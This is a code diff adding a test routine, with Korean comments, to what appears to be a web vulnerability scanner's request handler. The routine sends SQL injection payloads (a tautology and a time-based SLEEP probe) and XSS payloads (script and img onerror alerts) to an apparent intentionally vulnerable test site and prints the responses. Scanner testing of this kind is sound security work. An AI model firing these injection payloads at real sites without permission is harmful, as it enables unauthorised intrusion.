@@ -395,3 +395,55 @@ class RequestPayloadHandler:
         }
         cls._logger.debug(f"Set User-Agent to: {headers['User-Agent']}")
         return headers
+
+if __name__ == "__main__":
+    import sys
+
+    async def test_payload():
+        """
+        특정 사이트에 하나 또는 여러 개의 페이로드를 테스트합니다.
+        """
+        # 테스트할 URL과 파라미터 설정
+        test_url = "http://php.testsparker.com/artist.php"  
+        params = {"id": ""}  
+        method = "GET"  # 요청 메서드 (GET 또는 POST)
+        payloads1 = [ "' OR '1'='1' --", "\"' AND IF(1=1,SLEEP(5),0)--"] 
+        payloads2 = ["'\"<script>alert({{7*7}})</script><!---", "<img src=x onerror='javascript:alert(6)'>"]
+        try:
+            # 서버사이드 테스트
+            print("\n=== 서버사이드 테스트 시작 ===")
+            server_results = await RequestPayloadHandler.send_serverside(
+                url=test_url,
+                params=params,
+                method=method,
+                payloads=payloads1,
+            )
+            for result in server_results:
+                print(f"\nPayload: {result.payload}")
+                print(f"Status Code: {result.status_code}")
+                print(f"Response Time: {result.response_time:.2f}s")
+                print(f"Response Length: {result.response_length}")
+                print(f"Response Text: {result.response_text[:100]}...")  # 응답 텍스트 일부 출력
+
+            # 클라이언트사이드 테스트
+            print("\n=== 클라이언트사이드 테스트 시작 ===")
+            client_results = await RequestPayloadHandler.send_clientside(
+                url=test_url,
+                params=params,
+                method=method,
+                payloads=payloads2,
+            )
+            for result in client_results:
+                print(f"\nPayload: {result.payload}")
+                print(f"Status Code: {result.status_code}")
+                print(f"Response Time: {result.response_time:.2f}s")
+                print(f"Response Length: {result.response_length}")
+                print(f"Alert Triggered: {result.alert_triggered}")
+                print(f"Alert Message: {result.alert_message}")
+                print(f"Response Text: {result.response_text[:100]}...")  # 응답 텍스트 일부 출력
+
+        except Exception as error:
+            print(f"테스트 중 오류 발생: {error}", file=sys.stderr)
+
+    # asyncio 실행
+    asyncio.run(test_payload())
